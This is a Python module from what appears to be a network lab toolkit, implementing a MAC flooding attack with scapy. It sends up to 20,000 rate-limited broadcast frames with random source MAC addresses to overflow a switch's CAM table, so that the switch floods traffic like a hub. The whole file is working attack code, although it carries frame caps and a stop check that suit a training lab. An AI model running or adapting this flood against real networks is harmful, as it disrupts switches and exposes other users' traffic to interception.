"""MAC flooding: fill a switch CAM table with random source MACs."""

from __future__ import annotations

import random
from typing import Any

from scapy.all import Ether, Raw, conf, sendp  # type: ignore

from netlab.base import BaseModule, ModuleParam

MAX_FRAMES = 20000


def _rand_mac() -> str:
    raw = bytes([0x02]) + bytes(random.getrandbits(8) for _ in range(5))
    return ":".join(f"{b:02x}" for b in raw)


class MacFlood(BaseModule):
    name = "mac_flood"
    description = "Flood the switch CAM table with random source MAC addresses"
    category = "l2"

    @classmethod
    def parameters(cls) -> list[ModuleParam]:
        return [
            ModuleParam(name="interface", type="interface", label="Interface", required=False,
                default=None),
            ModuleParam(
                name="count",
                type="int",
                label="Frames",
                required=False,
                default=2000,
                description=f"Hard cap {MAX_FRAMES}",
            ),
            ModuleParam(
                name="rate_limit_pps",
                type="int",
                label="Rate limit (pps)",
                required=False,
                default=300,
            ),
        ]

    def run(self, params: dict[str, Any], logger: Any, rate_limiter: Any) -> None:
        iface = params["interface"]
        count = min(int(params.get("count", 2000)), MAX_FRAMES)
        conf.iface = iface
        conf.verb = 0
        print(f"[mac_flood] {count} frames on {iface}")
        for i in range(count):
            if self.should_stop():
                print("[mac_flood] Stopped")
                break
            rate_limiter.wait()
            pkt = Ether(src=_rand_mac(), dst="ff:ff:ff:ff:ff:ff") / Raw(bytes([i % 256]) * 32)
            sendp(pkt, iface=iface, verbose=0)
            logger.add_packets(1, len(bytes(pkt)))
            if (i + 1) % 500 == 0:
                print(f"  sent {i + 1}/{count}")
        print("── MAC flood finished ──")
        print("  If the CAM table overflowed, the switch falls back to flooding frames like a hub.")
